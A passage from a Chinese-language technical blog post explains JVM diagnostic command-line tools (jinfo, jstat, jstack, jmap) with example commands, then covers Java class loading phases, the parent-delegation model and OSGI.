<li><code>option</code>：表示可选的参数，如获取系统属性、JVM参数等。</li>
<li><code>pid</code>：表示要获取配置信息的Java虚拟机进程的ID。</li>
</ul>
<p>以下是一些常用的<code>jinfo</code>选项：</p>
<ul>
<li><code>-flag</code>：显示或修改指定的JVM参数。</li>
<li><code>-sysprops</code>：显示Java系统属性。</li>
<li><code>-flags</code>：显示JVM参数。</li>
</ul>
<p>举个例子，要获取一个Java进程（假设其进程ID为12345）的Java系统属性，可以运行以下命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">jinfo -sysprops 12345<br></code></pre></td></tr></table></figure>

<p>这个命令会输出Java进程的所有Java系统属性，如<code>java.version</code>、<code>java.vendor</code>、<code>java.home</code>等。您可以根据这些信息了解Java进程的运行环境和配置。</p>
<p>另一个例子，要查看一个Java进程（假设其进程ID为12345）的JVM参数，可以运行以下命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">jinfo -flags 12345<br></code></pre></td></tr></table></figure>

<p>这个命令会输出Java进程的所有JVM参数，如<code>-Xmx</code>、<code>-Xms</code>、<code>-XX:+UseParallelGC</code>等。您可以根据这些信息了解和优化Java进程的JVM配置。</p>
<h3 id="jstat"><a href="#jstat" class="headerlink" title="jstat"></a>jstat</h3><p>用于监控JVM内存使用情况和垃圾回收情况</p>
<p><code>jstat</code>的基本语法如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">jstat [option] [vmid] [interval] [count]<br></code></pre></td></tr></table></figure>

<ul>
<li><code>option</code>：表示要收集的统计信息类型，如垃圾回收、类加载等。</li>
<li><code>vmid</code>：表示要监控的Java虚拟机进程的ID。</li>
<li><code>interval</code>：表示数据收集的时间间隔（以毫秒为单位），可选参数。</li>
<li><code>count</code>：表示要收集的数据点数目，可选参数。</li>
</ul>
<p>以下是一些常用的<code>jstat</code>选项：</p>
<ul>
<li><code>-class</code>：显示关于类加载器的统计信息。</li>
<li><code>-compiler</code>：显示关于即时编译的统计信息。</li>
<li><code>-gc</code>：显示关于垃圾回收的统计信息。</li>
<li><code>-gccapacity</code>：显示关于垃圾回收的各个内存区域的容量。</li>
<li><code>-gcutil</code>：显示关于垃圾回收的各个内存区域的使用情况。</li>
<li><code>-gcnew</code>：显示关于新生代垃圾回收的统计信息。</li>
<li><code>-gcold</code>：显示关于老年代垃圾回收的统计信息。</li>
</ul>
<p>举个例子，要收集一个Java进程（假设其进程ID为12345）的垃圾回收统计信息，每隔1000毫秒收集一次，总共收集10次，可以运行以下命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">jstat -gc 12345 1000 10<br></code></pre></td></tr></table></figure>

<p>这个命令会输出一系列关于垃圾回收的统计信息，如内存区域的大小、已使用空间、垃圾回收次数等。</p>
<h3 id="jstack"><a href="#jstack" class="headerlink" title="jstack"></a>jstack</h3><p>用于生成虚拟机当前时刻的线程快照，目的通常是定位线程出现长时间停顿的原因。对于诊断Java应用程序的线程问题、锁竞争和死锁等问题非常有用。</p>
<p><code>jstack</code>的基本语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">jstack [option] pid<br></code></pre></td></tr></table></figure>

<ul>
<li><code>option</code>：表示可选的参数，如打印锁信息等。</li>
<li><code>pid</code>：表示要获取堆栈跟踪信息的Java虚拟机进程的ID。</li>
</ul>
<p>以下是一些常用的<code>jstack</code>选项：</p>
<ul>
<li><code>-l</code>：显示关于锁的附加信息，如已拥有的锁、等待的锁等。</li>
<li><code>-m</code>：显示关于本地方法的堆栈跟踪信息（仅适用于部分平台）。</li>
<li><code>-F</code>：强制执行堆栈跟踪，当正常执行失败时使用（仅适用于部分平台）。</li>
</ul>
<p>举个例子，要获取一个Java进程（假设其进程ID为12345）的线程堆栈跟踪信息，可以运行以下命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">jstack 12345<br></code></pre></td></tr></table></figure>

<p>这个命令会输出Java进程的所有线程的堆栈跟踪信息，包括线程ID、线程状态、调用栈等。您可以根据这些信息诊断和解决应用程序中的线程问题。</p>
<h3 id="jmap"><a href="#jmap" class="headerlink" title="jmap"></a>jmap</h3><p><code>jmap</code>（Java Memory Map Tool）是一个Java命令行工具，用于获取Java虚拟机（JVM）进程的内存映射信息。它可以帮助您分析Java堆（heap）、永久代（PermGen，仅JDK 7及更早版本）或元空间（Metaspace，JDK 8及更高版本）的使用情况，从而诊断和解决内存泄漏、内存溢出等问题</p>
<p><code>jmap</code>的基本语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">jmap [option] pid<br></code></pre></td></tr></table></figure>

<ul>
<li><code>option</code>：表示要执行的操作，如获取堆信息、生成堆转储文件等。</li>
<li><code>pid</code>：表示要获取内存映射信息的Java虚拟机进程的ID。</li>
</ul>
<p>以下是一些常用的<code>jmap</code>选项：</p>
<ul>
<li><code>-dump</code>：生成堆转储文件（heap dump），可以使用内存分析工具（如Eclipse MAT）对其进行进一步分析。</li>
<li><code>-histo</code>：显示堆中对象的实例数量、内存占用和类名等信息的直方图。</li>
<li><code>-heap</code>：显示堆的摘要信息，如使用的垃圾回收器、内存区域的大小和使用情况等。</li>
<li><code>-permstat</code>：显示永久代（PermGen）的类加载器、内存占用和类名等信息的统计信息（仅适用于JDK 7及更早版本）。</li>
<li><code>-clstats</code>：显示类加载器和系统类的统计信息。</li>
<li><code>-finalizerinfo</code>：显示在队列中等待执行的终结器方法的对象的信息。</li>
</ul>
<p>举个例子，要为一个Java进程（假设其进程ID为12345）生成堆转储文件，并将其保存到当前目录下的<code>heapdump.hprof</code>文件中，可以运行以下命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">jmap -dump:format=b,file=heapdump.hprof 12345<br></code></pre></td></tr></table></figure>

<p>这个命令会生成一个堆转储文件，其中包含了Java进程的内存使用情况。您可以使用内存分析工具（如Eclipse MAT）对其进行进一步分析，以诊断和解决内存相关问题。</p>
<h1 id="类加载机制"><a href="#类加载机制" class="headerlink" title="类加载机制"></a>类加载机制</h1><h2 id="类加载阶段"><a href="#类加载阶段" class="headerlink" title="类加载阶段"></a>类加载阶段</h2><p>Java虚拟机（JVM）的类加载机制是Java程序运行时将.class文件加载到内存的过程。类加载主要分为五个阶段：加载（Loading）、验证（Verification）、准备（Preparation）、解析（Resolution）和初始化（Initialization）。</p>
<ol>
<li><p>加载（Loading）: 在这个阶段，JVM将从文件系统或网络中查找指定的.class文件，然后将其二进制数据加载到内存中，创建一个Class对象来表示这个类。类加载器主要有三个：引导类加载器（Bootstrap ClassLoader）、扩展类加载器（Extension ClassLoader）和应用类加载器（Application ClassLoader）。</p>
</li>
<li><p>验证（Verification）: JVM会对已加载的二进制数据进行校验，确保其符合Java语言规范和JVM规范。这个过程包括：文件格式验证、元数据验证、字节码验证和符号引用验证。验证阶段的目的是确保加载的类文件不会对JVM产生不良影响。</p>
</li>
<li><p>准备（Preparation）: 在这个阶段，JVM会为类的静态变量分配内存，并赋予默认值。注意这里的默认值不是程序员在代码中指定的初始值，而是基本类型的零值或引用类型的null值。</p>
<p>而对于final类型的静态变量，如果它们在编译时可以确定值（即编译时常量），JVM会在准备阶段直接为它们分配内存并赋予程序员在代码中指定的初始值。这是因为final变量的值在程序运行期间是不可变的，所以可以提前赋值。然而，如果一个final类型的静态变量不能在编译时确定值（例如，它的值是通过方法调用得到的），那么这个变量在准备阶段仍然会被赋予默认值，然后在初始化阶段由程序员指定的值替换。</p>
</li>
<li><p>解析（Resolution）: 解析阶段主要是将类、接口、字段和方法等符号引用替换为直接引用。这个过程可能会触发其他类的加载。</p>
<p>在Java程序中，类、接口、字段和方法等元素在源代码中的表示形式通常是符号引用（Symbolic Reference）。符号引用是一种依赖于符号（如类名、方法名和字段名等）的引用形式。然而，为了在运行时更高效地访问这些元素，JVM需要将这些符号引用替换为直接引用（Direct Reference）。</p>
<p>直接引用是一种可以直接指向内存地址或者间接指向内存地址的引用。在JVM中，直接引用可以是指向方法区（Method Area）中类和接口数据结构的指针、指向实例变量和类变量的内存地址的偏移量，或者是指向常量池中某个常量的索引。</p>
<p>符号引用和直接引用的区别在于，符号引用需要在运行时通过查找和解析得到实际的内存地址，而直接引用已经包含了实际的内存地址信息，可以直接访问目标元素。因此，使用直接引用可以提高程序运行时的访问速度。</p>
<p>在类加载的解析阶段，JVM负责将类、接口、字段和方法等符号引用替换为直接引用。这个过程可能会触发其他类的加载。需要注意的是，并非所有的符号引用都会在解析阶段被替换为直接引用，有些符号引用会在程序运行时进行动态解析。这通常发生在反射和动态代理等场景下。</p>
</li>
<li><p>初始化（Initialization）: 在这个阶段，JVM会根据程序员在代码中指定的初始值，为类的静态变量赋予正确的值。此外，如果类有静态代码块，JVM会执行这些代码块。初始化阶段是类加载过程中的最后一个阶段。</p>
</li>
</ol>
<h2 id="父子类加载和初始化顺序关系"><a href="#父子类加载和初始化顺序关系" class="headerlink" title="父子类加载和初始化顺序关系"></a>父子类加载和初始化顺序关系</h2><p>在JVM类加载阶段，父子类关系表现在加载和初始化过程。加载子类时，所有父类被加载。初始化时，父类先于子类初始化，确保子类使用父类静态字段和方法时，父类已初始化。</p>
<h2 id="类加载器和双亲委派模型"><a href="#类加载器和双亲委派模型" class="headerlink" title="类加载器和双亲委派模型"></a>类加载器和双亲委派模型</h2><p>JVM类加载器（Class Loader）负责将.class文件加载到内存，主要有四种：</p>
<ol>
<li>引导类加载器（Bootstrap ClassLoader）：负责加载位于%Java_HOME%&#x2F;lib下的Java核心类库，如java.util等</li>
<li>扩展类加载器（Extension ClassLoader）：负责加载位于%Java_HOME%&#x2F;jre&#x2F;lib&#x2F;ext目录下Java扩展库，或通过java.ext.dirs系统变量加载指定路径下的类库</li>
<li>应用类加载器（Application ClassLoader）：负责加载用户程序的类路径（classpath）下的类</li>
<li>自定义类加载器（User ClassLoader）：通过继承java.lang.ClassLoader类并重写 findClass 方法实现</li>
</ol>
<p>类加载器采用双亲委派模型（Parent-Delegation Model）。当加载类时，先请求父加载器加载；父加载器无法加载时，当前加载器尝试加载。这保证了Java核心类库安全与一致性，避免应用程序覆盖核心类库。</p>
<h2 id="OSGI"><a href="#OSGI" class="headerlink" title="OSGI"></a>OSGI</h2><p>OSGI（Open Service Gateway Initiative）是一个用于实现模块化和动态组件系统的开放标准框架。它允许在一个Java虚拟机（JVM）实例中创建和管理多个模块化组件，这些组件被称为“bundles”。OSGI提供了一种将Java应用程序分解为更小、更易于管理和维护的模块的方法，从而提高了开发人员的生产力和代码的可重用性。</p>
<p>OSGI的主要特点如下：</p>
<ol>
<li><p>模块化：OSGI框架支持将Java应用程序划分为多个模块，每个模块都可以独立开发、部署和更新，从而降低了开发复杂性和维护成本。</p>
</li>
<li><p>动态：OSGI支持动态加载、卸载和更新模块，这意味着在不重启整个应用程序的情况下，可以热部署模块，提高了系统的灵活性和可扩展性。</p>
</li>
<li><p>服务注册和发现：OSGI提供了一个服务注册表，允许模块之间通过服务接口进行通信，而不是直接依赖于其他模块的具体实现。这有助于降低模块间的耦合度，提高代码的可维护性和可重用性。</p>
</li>
<li><p>版本管理：OSGI允许同一个JVM中存在不同版本的模块，这样可以在升级或修复某个模块时避免对其他模块产生影响。</p>
</li>
</ol>
<p>OSGI已被广泛应用于各种Java项目中，例如Eclipse IDE（集成开发环境）就是基于OSGI构建的</p>
<p>OSGI不遵循双亲委派模型，在安全上有所牺牲</p>
</div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous is-invisible is-hidden-mobile"><a href="/page/0/">Previous</a></div><div class="pagination-next"><a href="/page/2/">Next</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link is-current" href="/">1</a></li><li><a class="pagination-link" href="/page/2/">2</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="https://www.gravatar.com/avatar/9ff0d1457b602fb68b2837bc3ab35c14?s=128" alt="Song Baoru"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Song Baoru</p><p class="is-size-6 is-block">Welcome to my blog!</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Xi&#039;an, Shaanxi</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">Posts</p><a href="/archives"><p class="title">11</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Category</p><a href="/categories"><p class="title">1</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">Tags</p><a href="/tags"><p class="title">10</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ppoffice" target="_blank" rel="noopener">Follow</a></div></div></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">Links</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/IT/"><span class="level-start"><span class="level-item">IT</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-05-24T08:13:44.000Z">2023-05-24</time></p><p class="title"><a href="/2023/05/24/RocketMQ/">RocketMQ</a></p><p class="categories"><a href="/categories/IT/">IT</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-05-24T08:08:42.000Z">2023-05-24</time></p><p class="title"><a href="/2023/05/24/Spring-Cloud/">Spring Cloud</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-05-07T13:39:13.000Z">2023-05-07</time></p><p class="title"><a href="/2023/05/07/Java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/">Java并发编程</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-05-07T13:37:05.000Z">2023-05-07</time></p><p class="title"><a href="/2023/05/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-05-06T03:04:46.000Z">2023-05-06</time></p><p class="title"><a href="/2023/05/06/MyBatis/">MyBatis</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">Archives</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2023/"><span class="level-start"><span class="level-item">2023</span></span><span class="level-end"><span class="level-item tag">11</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/JVM/"><span class="tag">JVM</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Kafka/"><span class="tag">Kafka</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/MyBatis/"><span class="tag">MyBatis</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/MySQL/"><span class="tag">MySQL</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Redis/"><span class="tag">Redis</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/RocketMQ/"><span class="tag">RocketMQ</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Spring/"><span class="tag">Spring</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Spring-Cloud/"><span class="tag">Spring Cloud</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/java/"><span class="tag">java</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%B9%B6%E5%8F%91/"><span class="tag">并发</span><span class="tag">1</span></a></div></div></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">Subscribe for updates</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="Subscribe"></div></div></form></div></div></div><div class="card widget"><div class="card-content"><div class="notification is-danger">You need to set <code>client_id</code> and <code>slot_id</code> to show this AD unit. Please set it in <code>_config.yml</code>.</div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">follow.it</h3><form action="" method="post" target="_blank"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="Subscribe"></div></div></form></div></div></div></div><div class="column column-right is-4-tablet is-4-desktop is-4-widescreen  order-3"><!--!--></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="https://avatars.githubusercontent.com/u/41830790?v=4" alt="SBR Blog" height="28"></a><p class="is-size-7"><span>&copy; 2023 SBR</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2021</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "This website uses cookies to improve your experience.",
          dismiss: "Got it!",
          allow: "Allow cookies",
          deny: "Decline",
          link: "Learn more",
          policy: "Cookie Policy",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"Type something...","untitled":"(Untitled)","posts":"Posts","pages":"Pages","categories":"Categories","tags":"Tags"});
        });</script></body></html>